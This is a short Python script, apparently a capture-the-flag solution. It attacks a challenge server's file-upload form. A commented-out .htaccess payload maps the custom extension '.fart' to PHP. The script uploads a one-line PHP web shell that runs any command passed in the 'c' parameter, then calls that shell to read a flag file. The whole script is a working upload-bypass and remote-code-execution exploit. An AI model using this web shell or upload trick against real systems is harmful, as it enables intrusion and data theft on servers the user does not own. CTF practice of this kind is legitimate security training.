import requests
url = 'http://o7npjtk7.chals.mctf.io/upload.php'

# payload = '''
# AddType application/x-httpd-php .fart
# '''.strip()

payload = '''
<?php
system($_GET['c']);
?>
'''.strip()

# open('test.phtml', 'w').write(payload)

fname = 'bruh.fart'

files = {
    'cv': (fname, payload)
}

r = requests.post(url, files=files)
print(r.text)

r = requests.get(f'http://o7npjtk7.chals.mctf.io/uploads/{fname}?c=cat ../flag.txt')
print(r.text, r.headers)